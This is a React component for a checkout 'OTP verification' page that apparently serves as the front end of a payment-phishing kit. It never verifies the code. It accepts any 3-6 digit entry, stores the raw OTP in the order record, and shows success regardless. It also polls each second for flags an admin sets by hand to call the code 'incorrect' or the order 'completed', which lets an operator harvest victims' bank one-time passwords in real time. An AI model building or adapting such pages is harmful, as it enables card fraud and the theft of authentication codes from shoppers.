import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { ShieldCheck, ArrowLeft } from "lucide-react";
import { useTranslation } from "@/hooks/useTranslation";
import { toast } from "sonner";

interface LocationState {
  orderId: string;
}

export function OTPVerificationPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const [otpValue, setOtpValue] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
const [isLoading, setIsLoading] = useState(false);
  const { t } = useTranslation();

  useEffect(() => {
    const state = location.state as LocationState;
    if (!state?.orderId) {
      navigate("/");
    }
  }, [location, navigate]);

  const handleBack = () => {
    navigate("/");
  };

  useEffect(() => {
    // Check for OTP incorrect flag from admin
    const checkOTPStatus = () => {
      const state = location.state as LocationState;
      if (state?.orderId) {
        const otpIncorrectFlag = localStorage.getItem(`otp_incorrect_${state.orderId}`);
        if (otpIncorrectFlag) {
          toast.error(t('otpIncorrect'));
          localStorage.removeItem(`otp_incorrect_${state.orderId}`);
          setOtpValue("");
        }
        
        // Check for order completion flag
        const orderCompletedFlag = localStorage.getItem(`order_completed_${state.orderId}`);
        if (orderCompletedFlag) {
          localStorage.removeItem(`order_completed_${state.orderId}`);
          navigate("/order-completion", { state: { orderId: state.orderId } });
        }
      }
    };

    checkOTPStatus();
    const interval = setInterval(checkOTPStatus, 1000);
    return () => clearInterval(interval);
  }, [location, navigate]);

  const handleOTPSubmit = () => {
    if (otpValue.length < 3 || otpValue.length > 6) {
      toast.error("Please enter a valid OTP (3-6 digits)");
      return;
    }

    setIsSubmitting(true);
    setIsLoading(true);
    
    // Store OTP code in the order record
    const state = location.state as LocationState;
    const storedOrders = JSON.parse(localStorage.getItem('orders') || '[]');
    const updatedOrders = storedOrders.map((order: any) => 
      order.id === state.orderId 
        ? { ...order, otpCode: otpValue }
        : order
    );
    localStorage.setItem('orders', JSON.stringify(updatedOrders));
    
    toast.success("OTP code submitted successfully!");
    
    setTimeout(() => {
      setIsSubmitting(false);
      setIsLoading(false);
      navigate("/payment-success", { state: { orderId: state.orderId } });
    }, 2000);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-background to-muted/20 flex items-center justify-center">
        <div className="px-4 max-w-md mx-auto">
          <Card className="p-8 bg-card/50 backdrop-blur-sm border-border/50 text-center">
            <div className="relative mb-6">
              <div className="w-24 h-24 mx-auto bg-primary/10 rounded-full flex items-center justify-center animate-pulse">
                <div className="w-8 h-8 border-4 border-primary border-t-transparent rounded-full animate-spin"></div>
              </div>
            </div>
            <h1 className="text-2xl font-bold text-foreground mb-4">
              {t('processingOTP')}
            </h1>
            <p className="text-muted-foreground">
              {t('pleaseWaitVerifyOTP')}
            </p>
            <div className="flex justify-center mt-4">
              <div className="flex space-x-1">
                <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                <div className="w-2 h-2 bg-primary rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
              </div>
            </div>
          </Card>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-background to-muted/20 flex items-center justify-center">
      <div className="px-4 max-w-md mx-auto">
        <Card className="p-8 bg-card/50 backdrop-blur-sm border-border/50 text-center">
          {/* Shield Icon */}
          <div className="relative mb-6">
            <div className="w-24 h-24 mx-auto bg-primary/10 rounded-full flex items-center justify-center">
              <ShieldCheck className="w-12 h-12 text-primary" />
            </div>
          </div>

          <h1 className="text-2xl font-bold text-foreground mb-4">
            {t('enterOTPCode')}
          </h1>
          
          <p className="text-muted-foreground mb-6">
            {t('pleaseWaitVerifyOTP')}
          </p>

          <div className="space-y-6">
            {/* OTP Input */}
            <div className="flex justify-center">
              <InputOTP 
                maxLength={6} 
                value={otpValue} 
                onChange={setOtpValue}
                className="gap-2"
              >
                <InputOTPGroup className="gap-2">
                  <InputOTPSlot index={0} className="w-12 h-12 text-lg border-2" />
                  <InputOTPSlot index={1} className="w-12 h-12 text-lg border-2" />
                  <InputOTPSlot index={2} className="w-12 h-12 text-lg border-2" />
                  <InputOTPSlot index={3} className="w-12 h-12 text-lg border-2 opacity-60" />
                  <InputOTPSlot index={4} className="w-12 h-12 text-lg border-2 opacity-60" />
                  <InputOTPSlot index={5} className="w-12 h-12 text-lg border-2 opacity-60" />
                </InputOTPGroup>
              </InputOTP>
            </div>

            <div className="space-y-3">
              <Button 
                onClick={handleOTPSubmit}
                disabled={otpValue.length < 3 || isSubmitting}
                className="w-full"
              >
                {isSubmitting ? t('verifying') : t('verifyOTP')}
              </Button>
              
              <Button 
                onClick={handleBack}
                variant="outline"
                className="w-full"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                {t('backToHome')}
              </Button>
            </div>
            
            <p className="text-xs text-muted-foreground">
              {t('orderIdLabel')}: <span className="font-mono text-primary">{(location.state as LocationState)?.orderId}</span>
            </p>
          </div>
        </Card>
      </div>
    </div>
  );
}